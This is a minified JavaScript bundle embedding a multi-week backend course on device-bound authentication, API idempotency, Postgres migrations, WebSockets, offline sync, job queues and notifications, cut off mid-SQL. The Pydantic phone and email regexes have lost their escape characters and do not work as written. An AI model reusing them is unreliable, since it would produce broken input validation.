(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))n(s);new MutationObserver(s=>{for(const a of s)if(a.type==="childList")for(const r of a.addedNodes)r.tagName==="LINK"&&r.rel==="modulepreload"&&n(r)}).observe(document,{childList:!0,subtree:!0});function i(s){const a={};return s.integrity&&(a.integrity=s.integrity),s.referrerPolicy&&(a.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?a.credentials="include":s.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function n(s){if(s.ep)return;s.ep=!0;const a=i(s);fetch(s.href,a)}})();const u={id:1,title:"Authentication & Device Security",subtitle:"Weeks 1-3 · The fortress you build first",color:"#1a56db",emoji:"🔐",modules:[{id:1,title:"Device-Bound Auth + OTP + MPIN",week:"Week 1",goal:"Build the exact auth model used by UPI/banking apps — device-registered, MPIN-unlocked, rotating tokens.",tags:["JWT","Redis","Argon2","MPIN","Device Security"],content:[{type:"heading",text:"🗺 System Design: Draw This Before Writing Code"},{type:"para",text:"The entire auth system is a state machine. Map every state transition before touching a keyboard."},{type:"bullets",items:["State 1 → UNREGISTERED: No device, no session","State 2 → OTP_PENDING: Phone submitted, OTP sent, waiting for verify","State 3 → REGISTERED: Device registered, tokens issued, MPIN set","State 4 → LOCKED: Too many failed MPIN attempts, cooldown active","State 5 → REVOKED: Admin/user revoked device, all sessions dead","Transition diagram: draw arrows between all states with the trigger event and side effects"]},{type:"heading",text:"🗄 Full Database Schema"},{type:"code",text:`-- Core identity
CREATE TABLE users (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  phone       TEXT UNIQUE NOT NULL,
  email       TEXT UNIQUE,
  name        TEXT,
  status      TEXT NOT NULL DEFAULT 'active', -- active|banned|deleted
  created_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Each device gets a permanent ID
CREATE TABLE devices (
  id               UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id          UUID REFERENCES users(id) ON DELETE CASCADE,
  device_public_id TEXT NOT NULL,   -- hardware fingerprint hash
  device_name      TEXT,
  platform         TEXT,            -- ios|android|web
  push_token       TEXT,            -- FCM/APNs for notifications
  last_seen_at     TIMESTAMPTZ,
  revoked          BOOLEAN DEFAULT false,
  revoked_at       TIMESTAMPTZ,
  created_at       TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Token rotation log
CREATE TABLE sessions (
  id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id             UUID REFERENCES users(id),
  device_id           UUID REFERENCES devices(id),
  refresh_token_hash  TEXT UNIQUE NOT NULL,
  expires_at          TIMESTAMPTZ NOT NULL,
  rotated_from        UUID,         -- previous session id for replay detection
  revoked             BOOLEAN DEFAULT false,
  ip_address          INET,
  user_agent          TEXT,
  created_at          TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- OTP rate limiting
CREATE TABLE otp_requests (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  phone       TEXT NOT NULL,
  code_hash   TEXT NOT NULL,       -- hash of the 6-digit code
  expires_at  TIMESTAMPTZ NOT NULL,
  attempts    INT DEFAULT 0,
  used        BOOLEAN DEFAULT false,
  ip_address  INET,
  created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Indexes
CREATE INDEX idx_sessions_refresh ON sessions(refresh_token_hash);
CREATE INDEX idx_sessions_user ON sessions(user_id, revoked);
CREATE INDEX idx_devices_user ON devices(user_id);
CREATE INDEX idx_otp_phone ON otp_requests(phone, created_at);`},{type:"heading",text:"🔌 All Endpoints"},{type:"table",headers:["Method","Path","Auth Required","Rate Limit","What It Does"],rows:[["POST","/auth/otp/request","None","3/phone/10min","Generate OTP, hash+store, send SMS"],["POST","/auth/otp/verify","None","5/phone/10min","Verify OTP → access token + refresh token + device_id"],["POST","/auth/refresh","Refresh token","200/s","Rotate refresh token → new access token (burns old one)"],["POST","/auth/logout","Bearer","None","Revoke current session"],["POST","/auth/device/revoke","Bearer","None","Revoke a specific device (kills all its sessions)"],["GET","/auth/devices","Bearer","None","List all devices for current user"],["POST","/auth/mpin/set","Bearer","None","Store salted MPIN hash (server stores verifier only)"],["POST","/auth/mpin/verify","Device key","5/device/15min","Verify MPIN → unlock new access token"]]},{type:"heading",text:"⚙️ Core Implementation Rules"},{type:"bullets",items:["Hash refresh tokens with SHA-256 before DB storage — never store raw","Hash OTP codes with SHA-256 + phone as salt before storage","Set access token TTL to 15 minutes, refresh token TTL to 30 days","The server never stores or sees the MPIN — only a bcrypt/argon2id hash","Lock phone for 1 hour after 5 failed OTP attempts (Redis key with TTL)","Lock device for 15 minutes after 5 failed MPIN attempts","Use SELECT ... FOR UPDATE when rotating tokens to prevent race conditions","On mobile, encrypt the refresh token with iOS Keychain / Android Keystore"]},{type:"heading",text:"💻 Practical Task: Build It"},{type:"task",title:"Day-by-Day Build Plan",steps:["Day 1: Draw state machine diagram on paper. Write OpenAPI spec for all 8 endpoints. Review with a peer.","Day 2: Write Alembic migration for all 4 tables. Seed with test data manually.","Day 3: Implement /auth/otp/request and /auth/otp/verify with argon2id hashing and Redis rate limit.","Day 4: Implement token rotation logic — write the rotation function with SELECT FOR UPDATE.","Day 5: Write pytest suite — happy path, rotation, expiry, parallel refresh race condition."]},{type:"heading",text:"🔥 Break Tests — Run These Deliberately"},{type:"checklist",title:"Failure Scenarios to Reproduce",items:["Reuse an old refresh token after rotation → must get 401 + session revoked","Send 10 parallel /auth/refresh requests with same token → exactly 1 succeeds","Replay the same OTP twice → second attempt must return 400 Used","Submit OTP after expiry → 410 Gone, not 500","Simulate token file copy to new device (no Keystore) → server rejects via device_id mismatch","Hit OTP endpoint 10x fast from same IP → get locked after 3 attempts","Revoke device while a request is in-flight → that request still completes (grace), next one fails"]},{type:"heading",text:"🎨 Creative Challenge"},{type:"scenario",title:'Build a "Trusted Devices" Dashboard',problem:"A user has logged in from 3 different phones and 2 browsers. They notice an unknown device from a different city and want to remove it instantly.",solution:'Build GET /auth/devices returning device name, platform, last_seen_at, city, and a "current" flag. Build DELETE /auth/devices/:id that revokes the device + all its sessions + sends a push notification to remaining trusted devices saying "A device was removed."'}]},{id:2,title:"Multi-Channel Auth + QR Web Login",week:"Week 2",goal:"Support email/password login, magic links, and WhatsApp-Web-style QR code login from phone.",tags:["Magic Link","QR Login","CSRF","bcrypt"],content:[{type:"heading",text:"🗺 System Design: QR Web Login Flow"},{type:"para",text:"Model this exactly like WhatsApp Web. The web page is a dumb terminal — the phone is the authenticator."},{type:"bullets",items:['Step 1: Browser loads /login → calls POST /auth/web/challenge → receives {code: "X4K2M7", expires_in: 120}',"Step 2: Browser polls GET /auth/web/status?code=X4K2M7 every 2s, or opens WebSocket",'Step 3: User opens mobile app, sees "Approve Web Login" screen, taps Approve',"Step 4: Mobile calls POST /auth/web/approve with mobile Bearer token","Step 5: Server atomically: marks challenge consumed=true, creates web_session linked to user","Step 6: Browser next poll gets 200 + web session token → user is logged in","Race condition to prevent: two phones approve same challenge simultaneously → DB UNIQUE constraint on code wins"]},{type:"code",text:`-- New tables
CREATE TABLE login_challenges (
  id             UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  code           TEXT UNIQUE NOT NULL,    -- 6-char alphanumeric
  qr_data        TEXT,                    -- encoded for QR image
  expires_at     TIMESTAMPTZ NOT NULL,
  consumed       BOOLEAN DEFAULT false,
  consumed_at    TIMESTAMPTZ,
  web_session_id UUID,
  user_id        UUID,
  created_at     TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE magic_links (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email       TEXT NOT NULL,
  token_hash  TEXT UNIQUE NOT NULL,
  expires_at  TIMESTAMPTZ NOT NULL,
  used        BOOLEAN DEFAULT false,
  used_at     TIMESTAMPTZ
);

CREATE TABLE email_credentials (
  user_id       UUID PRIMARY KEY REFERENCES users(id),
  email         TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,           -- bcrypt cost=12
  verified      BOOLEAN DEFAULT false,
  updated_at    TIMESTAMPTZ
);`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"QR Login End-to-End",steps:["Build the challenge + polling endpoints first. Test with curl — verify the status moves from pending→approved→expired.",'Add a simple HTML page (no framework) that polls every 2s and shows "Waiting..." then "Logging in...".',"Implement the mobile approve endpoint. Test the full flow: curl the challenge, curl the approve, watch the web page redirect.","Add the race condition test: two concurrent approve requests for same code → only 1 wins.","Add a 120-second auto-expire job using Celery beat that marks stale challenges expired."]},{type:"heading",text:"🔥 Break Tests"},{type:"checklist",title:"Failure Scenarios",items:["Approve same challenge twice → 409 Conflict on second","Approve after expiry → 410 Gone","Poll a code that never existed → 404 Not Found","Magic link clicked twice → second click returns 410 Already Used","Magic link with wrong token → 401 Invalid","Email login with correct email but wrong password 10x → account lock after N attempts"]}]},{id:3,title:"Session Orchestration + Risk Scoring",week:"Week 3",goal:"Global session control panel, suspicious login detection, and step-up authentication.",tags:["Redis","Geolocation","Risk Score","Step-Up Auth"],content:[{type:"heading",text:"🗺 System Design: Layered Auth Checks"},{type:"para",text:"Every request passes through 3 gates: (1) JWT signature valid, (2) Redis session not revoked, (3) Risk score acceptable."},{type:"heading",text:"⚙️ Risk Scoring Engine"},{type:"code",text:`def compute_risk_score(event: LoginEvent, user: User) -> int:
    score = 0

    # New device never seen before
    if not is_known_device(user.id, event.device_fingerprint):
        score += 30

    # Login from new country
    if event.country != user.last_known_country:
        score += 40

    # Login from new city (same country)
    elif event.city != user.last_known_city:
        score += 15

    # Unusual hour (2 AM - 5 AM local time)
    if is_unusual_hour(event.timestamp, event.timezone):
        score += 10

    # High velocity: more than 5 logins in 1 hour
    recent_logins = get_recent_login_count(user.id, minutes=60)
    if recent_logins > 5:
        score += 50

    # VPN/Tor/Proxy detected
    if is_vpn_or_proxy(event.ip):
        score += 25

    return score

# score >= 50: require step-up OTP
# score >= 80: block and alert user
# score >= 100: auto-revoke all sessions, force re-registration`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build the Risk Dashboard",steps:["Build a login_events table that stores every login attempt with IP, country, city, user_agent, risk_score.","Integrate ip-api.com (free) to get country/city from IP on every login.","Build the risk score function and unit test it for each scenario independently.","Build GET /admin/users/:id/login-history endpoint showing all login events with risk scores.","Implement step-up OTP: if risk >= 50, the session token is flagged step_up_required=true and most endpoints return 403 until OTP is completed."]},{type:"heading",text:"🎨 Creative Challenge"},{type:"scenario",title:"Impossible Travel Detection",problem:"A user logs in from Mumbai at 10:00 PM, then from London at 10:05 PM. Physically impossible. But your system issued both sessions.",solution:'After every successful login, calculate distance and time from previous login. If speed > 900 km/h (faster than a plane), auto-revoke all sessions, send SMS "We detected unusual access, all sessions cleared", require fresh OTP + MPIN reset.'}]}]},p={id:2,title:"API Design, Data Modeling & Real-Time",subtitle:"Weeks 4-6 · API contracts, bulletproof schemas, live sync",color:"#0e9f6e",emoji:"🧱",modules:[{id:4,title:"API Design, Versioning & Idempotency",week:"Week 4",goal:"Design APIs that never break existing clients, handle retries safely, and document themselves.",tags:["REST","OpenAPI","Idempotency","Versioning","Pydantic"],content:[{type:"heading",text:"🗺 System Design: API Contract Principles"},{type:"bullets",items:["Additive changes only: never remove or rename a field in the same version","URL versioning (/v1, /v2) is explicit and the most debuggable approach","The API contract is a promise to clients — breaking it breaks production apps","Always version from day 1, even if you only have v1 now","Deprecation window: keep old version alive for 12 months minimum after v2 ships"]},{type:"heading",text:"⚙️ Idempotency Deep Dive"},{type:"code",text:`# The idempotency middleware — wrap ALL mutating endpoints with this
from fastapi import Request, Response
from redis import Redis
import hashlib, json

async def idempotency_middleware(request: Request, call_next) -> Response:
    # Only apply to mutating methods
    if request.method not in ('POST', 'PUT', 'PATCH', 'DELETE'):
        return await call_next(request)

    key = request.headers.get('Idempotency-Key')
    if not key:
        return await call_next(request)

    user_id = request.state.user_id  # set by auth middleware
    redis_key = f"idempotency:{user_id}:{key}"

    # Check for cached response
    cached = redis.get(redis_key)
    if cached:
        data = json.loads(cached)
        return Response(
            content=data['body'],
            status_code=data['status_code'],
            headers={'X-Idempotent-Replayed': 'true'},
            media_type='application/json'
        )

    # Execute the real request
    response = await call_next(request)

    # Cache response (only for non-5xx)
    if response.status_code < 500:
        body = b''
        async for chunk in response.body_iterator:
            body += chunk

        redis.setex(redis_key, 86400, json.dumps({
            'status_code': response.status_code,
            'body': body.decode()
        }))

        return Response(
            content=body,
            status_code=response.status_code,
            headers=dict(response.headers),
            media_type='application/json'
        )

    return response`},{type:"heading",text:"📐 Pydantic Schema Patterns"},{type:"code",text:`from pydantic import BaseModel, Field, ConfigDict, field_validator
from uuid import UUID
from datetime import datetime
from typing import Optional, Generic, TypeVar

T = TypeVar('T')

# Generic paginated response wrapper
class PaginatedResponse(BaseModel, Generic[T]):
    data: list[T]
    next_cursor: Optional[str] = None
    total: Optional[int] = None
    has_more: bool = False

# Always have separate Create/Update/Response models
class UserCreate(BaseModel):
    phone: str = Field(..., pattern=r'^+[1-9]d{9,14}$')
    name: str = Field(..., min_length=2, max_length=100)
    device_id: str = Field(..., min_length=8)

class UserUpdate(BaseModel):
    name: Optional[str] = Field(None, min_length=2, max_length=100)
    email: Optional[str] = Field(None, pattern=r'^[^@]+@[^@]+.[^@]+$')

class UserResponse(BaseModel):
    id: UUID
    phone: str
    name: str
    email: Optional[str]
    created_at: datetime
    # Never expose: password_hash, internal_flags, raw_tokens
    model_config = ConfigDict(from_attributes=True)`},{type:"heading",text:"💻 Practical Task: API-First Development"},{type:"task",title:"Build the User Profile API",steps:["Write the OpenAPI spec for CRUD on /v1/users BEFORE writing any code. Review it for consistency.","Implement GET /v1/users/me — returns the current user profile from cache (Redis) first, DB on miss.","Implement PATCH /v1/users/me — partial update with Pydantic, write-through cache invalidation.","Add the Idempotency-Key middleware. Test with duplicate PATCH requests — verify only 1 DB write happens.","Write 15 pytest test cases: happy path, validation errors, missing fields, wrong types, auth failures.","Write an OpenAPI validator script that fetches /openapi.json and checks all responses match schemas."]},{type:"heading",text:"🔥 Break Tests"},{type:"checklist",title:"Failure Scenarios",items:["Same POST with same Idempotency-Key → identical response, 1 DB record","Idempotency-Key on a GET request → should be completely ignored","Send v1 request format to v2 endpoint → clear 422 with field path in error",'Remove a required field from response in "minor version" → v1 clients break silently',"Two simultaneous identical POST requests (no idempotency key) → two records created (document this is expected behavior)","Idempotency key stored in Redis expires after 24h → same key creates a new record (test this!)"]}]},{id:5,title:"Data Modeling, Migrations & Indexing",week:"Week 5",goal:"Design schemas that survive millions of rows, with migrations you can run and reverse safely.",tags:["PostgreSQL","Alembic","Indexes","Partitioning","JSONB"],content:[{type:"heading",text:"🗺 System Design: Schema Evolution Strategy"},{type:"bullets",items:["Schema changes are irreversible in prod unless you plan for rollback from the start","Never run a migration that locks the table > 1 second in production","The expand-contract pattern: add new → migrate data → remove old (3 separate deploys)","Every migration needs both upgrade() and downgrade() — no exceptions","Test migrations on a prod-size DB snapshot in staging first"]},{type:"heading",text:"📊 Index Design Rules"},{type:"table",headers:["Index Type","When to Use","Watch Out For","Example Query"],rows:[["B-tree (default)","Equality, range, ORDER BY","Won't help on LIKE '%abc%'","WHERE user_id = $1"],["Composite B-tree","Multi-column WHERE clauses","Column order matters — leading column must be in WHERE","WHERE user_id = $1 AND revoked = false"],["Partial index","Only a subset of rows is queried","Condition must match your WHERE exactly","WHERE revoked = false (index only active sessions)"],["GIN","JSONB @> queries, full-text","Slower writes, larger size",`metadata @> '{"type": "payment"}'`],["BRIN","Append-only time-series tables","Only useful if data is physically ordered by time","WHERE created_at BETWEEN $1 AND $2 on events table"],["Hash","Exact equality only, never ranges","Cannot be used for ORDER BY or ranges","WHERE email = $1"]]},{type:"code",text:`-- Zero-downtime NOT NULL column add:
-- Step 1 (deploy A): Add nullable
ALTER TABLE users ADD COLUMN timezone TEXT;

-- Step 2: Backfill in batches (never UPDATE all at once)
DO $$
DECLARE batch_size INT := 1000;
DECLARE last_id UUID := NULL;
BEGIN
  LOOP
    WITH updated AS (
      UPDATE users
      SET timezone = 'UTC'
      WHERE id IN (
        SELECT id FROM users
        WHERE timezone IS NULL
        AND (last_id IS NULL OR id > last_id)
        ORDER BY id LIMIT batch_size
      )
      RETURNING id
    )
    SELECT max(id) INTO last_id FROM updated;
    EXIT WHEN NOT FOUND OR last_id IS NULL;
    PERFORM pg_sleep(0.05); -- don't hammer the DB
  END LOOP;
END $$;

-- Step 3 (deploy B): Add NOT NULL + DEFAULT
ALTER TABLE users ALTER COLUMN timezone SET NOT NULL;
ALTER TABLE users ALTER COLUMN timezone SET DEFAULT 'UTC';

-- Index without locking (always use CONCURRENTLY in prod)
CREATE INDEX CONCURRENTLY idx_users_timezone ON users(timezone);`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Schema Migration Gauntlet",steps:['Design a "notes" feature schema: notes table with user_id, title, body, tags (JSONB), deleted_at (soft delete).',"Write Alembic migration with both upgrade() and downgrade(). Apply it. Verify. Roll it back.","Add a GIN index on tags. Measure query speed before/after with EXPLAIN ANALYZE.",'Simulate the expand-contract pattern: rename body → content across 3 separate "deploys" (migration files).',"Write a script that connects to the DB and runs EXPLAIN ANALYZE on your 5 most common query patterns.","Run your migration while under load (Locust sending 100 req/s) — measure latency spike."]}]},{id:6,title:"Real-Time: WebSocket, SSE & Redis Pub/Sub",week:"Week 6",goal:"Build live push updates from server to client. Handle thousands of concurrent connections without memory leaks.",tags:["WebSocket","SSE","Redis Pub/Sub","Presence","Fan-out"],content:[{type:"heading",text:"🗺 System Design: Pub/Sub Fan-Out Architecture"},{type:"bullets",items:["Problem: User A sends a message. Users B, C, D are connected to different FastAPI worker processes. How do B, C, D get the update?","Solution: Each worker subscribes to Redis Pub/Sub. When any worker publishes an event, ALL workers receive it and forward to their connected clients.","Scale limit: Redis Pub/Sub is in-memory fan-out. At very high scale (>100k channels) consider Redis Streams or Kafka.",'Presence: use Redis keys with TTL. presence:{user_id} → "online". Client sends heartbeat every 15s to renew TTL=30s.',"Backpressure: if client is slow and cannot consume, drop oldest messages or disconnect the client."]},{type:"code",text:`# Complete WebSocket handler with presence, auth, and backpressure
import asyncio
from fastapi import WebSocket, WebSocketDisconnect, Depends
from redis.asyncio import Redis
import json

class ConnectionManager:
    def __init__(self):
        # user_id -> set of WebSocket connections (multiple tabs)
        self.active: dict[str, set[WebSocket]] = {}

    async def connect(self, user_id: str, ws: WebSocket):
        await ws.accept()
        self.active.setdefault(user_id, set()).add(ws)

    def disconnect(self, user_id: str, ws: WebSocket):
        if user_id in self.active:
            self.active[user_id].discard(ws)
            if not self.active[user_id]:
                del self.active[user_id]

    async def send_to_user(self, user_id: str, message: dict):
        if user_id not in self.active:
            return
        dead = set()
        for ws in self.active[user_id]:
            try:
                # Timeout: drop slow clients instead of blocking
                await asyncio.wait_for(
                    ws.send_text(json.dumps(message)),
                    timeout=2.0
                )
            except (asyncio.TimeoutError, WebSocketDisconnect):
                dead.add(ws)
        for ws in dead:
            self.active[user_id].discard(ws)

manager = ConnectionManager()

@app.websocket('/ws')
async def websocket_endpoint(ws: WebSocket, user_id: str = Depends(get_ws_user)):
    await manager.connect(user_id, ws)

    # Mark online
    await redis.setex(f'presence:{user_id}', 30, 'online')

    # Subscribe to user's private channel
    pubsub = redis.pubsub()
    await pubsub.subscribe(f'user:{user_id}')

    async def heartbeat():
        while True:
            await asyncio.sleep(15)
            await redis.setex(f'presence:{user_id}', 30, 'online')

    try:
        hb_task = asyncio.create_task(heartbeat())
        async for msg in pubsub.listen():
            if msg['type'] == 'message':
                await manager.send_to_user(user_id, json.loads(msg['data']))
    except WebSocketDisconnect:
        pass
    finally:
        hb_task.cancel()
        manager.disconnect(user_id, ws)
        await redis.delete(f'presence:{user_id}')
        await pubsub.unsubscribe(f'user:{user_id}')`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build a Live Notification Feed",steps:["Implement the WebSocket endpoint with auth (extract user_id from token in query param or first message).","Build a simple React component that connects to WebSocket and appends received messages to a list.","Test with 2 browser tabs open — publishing to Redis should deliver to both tabs simultaneously.","Build a presence API: GET /users/:id/online → checks Redis presence key → returns {online: true, last_seen: ...}.","Simulate a slow client: add a 5s sleep in JS before processing messages. Verify server drops and disconnects after timeout."]},{type:"heading",text:"🎨 Creative Challenge"},{type:"scenario",title:"Live Typing Indicator",problem:'Build a "User X is typing..." indicator like WhatsApp. Every keypress should show the indicator to other users in real-time, and it must auto-dismiss after 3 seconds of inactivity.',solution:'Client sends {type: "typing", user_id, conversation_id} over WebSocket. Server publishes to conversation:{id} channel. Other subscribers receive it and show the indicator. Store typing:{user_id}:{conv_id} in Redis with TTL=3s. If key expires, indicator disappears.'}]}]},m={id:3,title:"Offline Sync, Background Jobs & Notifications",subtitle:"Weeks 7-9 · Async-first architecture for resilient apps",color:"#7e3af2",emoji:"⚡",modules:[{id:7,title:"Offline-First Sync & Conflict Resolution",week:"Week 7",goal:"Mobile app works without internet. When reconnecting, changes sync correctly without data loss.",tags:["CRDT","Vector Clocks","Operation Log","Sync Protocol"],content:[{type:"heading",text:"🗺 System Design: Operation Log Architecture"},{type:"para",text:"Key insight: do NOT sync state — sync operations. An operation log is deterministic and replayable."},{type:"code",text:`-- Every change generates an operation record
CREATE TABLE operations (
  id               UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  client_id        UUID NOT NULL,       -- which device generated this
  entity_type      TEXT NOT NULL,       -- 'note', 'task', 'contact', 'file'
  entity_id        UUID NOT NULL,
  operation        TEXT NOT NULL,       -- 'create' | 'update' | 'delete'
  payload          JSONB NOT NULL,      -- the diff (not full state)
  client_timestamp TIMESTAMPTZ NOT NULL,  -- client's local clock
  server_timestamp TIMESTAMPTZ,           -- set when server receives it
  version          INT NOT NULL,          -- Lamport timestamp per entity
  synced           BOOLEAN DEFAULT false,
  sync_batch_id    UUID,                  -- which sync call delivered this
  conflict_resolved BOOLEAN DEFAULT false
);

CREATE INDEX idx_ops_entity ON operations(entity_id, version);
CREATE INDEX idx_ops_client ON operations(client_id, synced);
CREATE INDEX idx_ops_server_ts ON operations(server_timestamp);`},{type:"heading",text:"⚖️ Conflict Resolution Strategies"},{type:"table",headers:["Strategy","How It Works","Best For","Downside"],rows:[["Last-Write-Wins (LWW)","Highest server_timestamp wins. Loser's changes discarded.","User preferences, settings","Silent data loss possible"],["First-Write-Wins","Lowest timestamp wins. Later changes rejected.","Booking systems, reservations","Late clients always lose"],["Server-Always-Wins","Server version always canonical. Client change is advisory.","Financial ledgers, audit trails","Client feels ignored"],["Merge (field-level)","Each field resolved independently by timestamp","Document editing","Complex to implement"],["CRDT (no conflicts)","Data type designed so any merge order produces same result","Collaborative counters, sets","Limited data types"],["Manual Resolution","Both versions preserved, user picks winner","Important documents","Requires UI work"]]},{type:"code",text:`# Sync pull endpoint — client asks for operations since last sync
@router.get('/sync/pull')
async def sync_pull(
    since: datetime,
    client_id: UUID,
    user_id: UUID = Depends(get_current_user)
):
    # Return all ops for this user's entities after the given timestamp
    ops = await db.execute(
        select(Operation)
        .where(
            Operation.entity_id.in_(get_user_entity_ids(user_id)),
            Operation.server_timestamp > since,
            Operation.client_id != client_id  # don't return own ops
        )
        .order_by(Operation.server_timestamp)
        .limit(500)  # batch limit
    )
    return {
        'operations': [op.to_dict() for op in ops],
        'server_time': datetime.utcnow().isoformat(),
        'has_more': len(ops) == 500
    }

# Sync push endpoint — client sends locally generated ops
@router.post('/sync/push')
async def sync_push(body: SyncPushRequest, user_id: UUID = Depends(get_current_user)):
    results = []
    for op in body.operations:
        try:
            result = await apply_operation(op, user_id)
            results.append({'id': op.id, 'status': 'applied', 'server_version': result.version})
        except ConflictError as e:
            results.append({'id': op.id, 'status': 'conflict', 'winner': e.winning_version})
        except Exception as e:
            results.append({'id': op.id, 'status': 'error', 'message': str(e)})
    return {'results': results}`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build Offline Notes App Sync",steps:["Build the operations table and sync push/pull endpoints.","Create a simple notes entity: create/update/delete notes with title and body.","Implement LWW conflict resolution: when two ops update same note, higher server_timestamp wins.",'Test: create a note on "device A", create conflicting update on "device B", sync both — verify winner.',"Test partial sync: push 10 ops, fail on op 6 (throw error), verify client retries from op 6 only.","Test clock skew: set client_timestamp to be 2 hours in the future — server must use server_timestamp for ordering."]},{type:"heading",text:"🎨 Creative Challenge"},{type:"scenario",title:"Delta Compression",problem:"Your mobile app sends the entire note body on every update. For a 50KB note with a 1-character edit, you're wasting 50KB of bandwidth per sync.",solution:'Implement JSON Patch (RFC 6902) for the payload field. Instead of sending the full note, send [{op: "replace", path: "/title", value: "New Title"}]. The server applies the patch atomically. Measure bandwidth savings on a 10KB document.'}]},{id:8,title:"Background Jobs, Queues & Dead-Letter",week:"Week 8",goal:"Move all slow work out of request handlers. Never lose a job even if workers crash.",tags:["Celery","Redis Streams","DLQ","Exponential Backoff","Idempotency"],content:[{type:"heading",text:"🗺 System Design: Job Lifecycle"},{type:"bullets",items:["Job states: PENDING → IN_PROGRESS → COMPLETED | FAILED → RETRYING → DEAD","At-least-once delivery: a job may execute more than once — make every job idempotent","At-most-once delivery: guarantee only when loss is acceptable (e.g., analytics pings)","Exactly-once: impossible in distributed systems. Approximate with idempotency keys + dedup","Worker crash safety: Celery uses Redis ACK — if worker dies mid-job, job requeues automatically"]},{type:"code",text:`# Job definition with full retry + DLQ handling
from celery import Celery
from datetime import timedelta
import random

app = Celery('tasks', broker='redis://localhost:6379/0')

@app.task(
    bind=True,
    max_retries=5,
    default_retry_delay=5,
    acks_late=True,        # only ACK after successful execution
    reject_on_worker_lost=True  # requeue if worker dies
)
def send_payment_notification(self, user_id: str, amount: float, txn_id: str):
    # Idempotency check: have we already sent this notification?
    if redis.get(f"notif_sent:{txn_id}"):
        return {'status': 'already_sent', 'txn_id': txn_id}

    try:
        user = get_user(user_id)
        push_client.send(
            token=user.push_token,
            title="Payment Received",
            body=f"₹{amount:.2f} received"
        )
        # Mark as sent (idempotency guard, TTL = 7 days)
        redis.setex(f"notif_sent:{txn_id}", 604800, '1')
        return {'status': 'sent'}

    except PushServiceUnavailable as e:
        # Exponential backoff with jitter
        delay = min(2 ** self.request.retries, 3600)
        jitter = random.uniform(0, delay * 0.1)
        raise self.retry(exc=e, countdown=delay + jitter)

    except Exception as e:
        # After max_retries, Celery moves to DLQ automatically
        # Log to failed_jobs table for manual inspection
        db.add(FailedJob(
            task_name='send_payment_notification',
            payload={'user_id': user_id, 'amount': amount, 'txn_id': txn_id},
            error=str(e)
        ))
        raise`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build a Resilient Email Queue",steps:["Set up Celery with Redis broker. Run a worker. Send a test task. Verify it executes.","Build send_welcome_email task with exponential backoff. Test: mock the email client to fail 3 times then succeed.","Build the failed_jobs table. Test: after max retries, verify job lands in failed_jobs with full payload and error message.","Build GET /admin/failed-jobs endpoint — list all failed jobs with payload and error.","Build POST /admin/failed-jobs/:id/retry — re-enqueue a failed job (must be idempotent!).","Load test: enqueue 10,000 jobs at once. Monitor worker throughput. Watch Redis memory.","Test worker crash: kill the worker process mid-execution. Verify job requeues and completes on restart."]}]},{id:9,title:"Notification System: Push, Email, In-App",week:"Week 9",goal:"Deliver notifications across 3 channels with user preferences, dedup, and delivery tracking.",tags:["FCM","APNs","Email","Dedup","Delivery Tracking"],content:[{type:"heading",text:"🗺 System Design: Fan-out Notification Pipeline"},{type:"bullets",items:["Event fires (payment received) → Notification Service receives event → checks user preferences","Channel selection: if user is online (presence check) → push only. If offline → push + email.","Always store in-app notification regardless of channel delivery status","Dedup key prevents sending the same notification twice (common in distributed event systems)","Delivery tracking: know exactly which notifications were delivered, opened, or failed"]},{type:"code",text:`-- Complete notification data model
CREATE TABLE notification_templates (
  id             UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name           TEXT UNIQUE NOT NULL,   -- 'payment_received', 'file_shared'
  title_template TEXT NOT NULL,          -- "₹{{amount}} received from {{sender}}"
  body_template  TEXT NOT NULL,
  channels       TEXT[] DEFAULT '{push,email,inapp}'
);

CREATE TABLE notifications (
  id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id      UUID REFERENCES users(id),
  template_id  UUID REFERENCES notification_templates(id),
  data         JSONB NOT NULL,           -- template variables
  dedup_key    TEXT UNIQUE,              -- prevents duplicates
  status       TEXT DEFAULT 'pending',  -- pending|sent|failed|cancelled
  scheduled_at TIMESTAMPTZ,             -- for delayed notifications
  created_at   TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE notification_deliveries (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  notification_id UUID REFERENCES notifications(id),
  channel         TEXT NOT NULL,         -- push|email|inapp
  status          TEXT DEFAULT 'pending',
  provider_id     TEXT,                  -- FCM message_id or email provider ID
  sent_at         TIMESTAMPTZ,
  delivered_at    TIMESTAMPTZ,
  opened_at       TIMESTAMPTZ,
  error           TEXT,
  retry_count     INT DEFAULT 0
);

CREATE TABLE notification_preferences (
  user_id    UUID REFERENCES users(id),
  event_type TEXT NOT NULL,
  channel    TEXT NOT NULL,
  enabled    BOOLEAN DEFAULT true,
  quiet_hours_start  TIME,              -- e.g., 23:00
  quiet_hours_end    TIME,              -- e.g., 07:00
  PRIMARY KEY (user_id, event_type, channel)
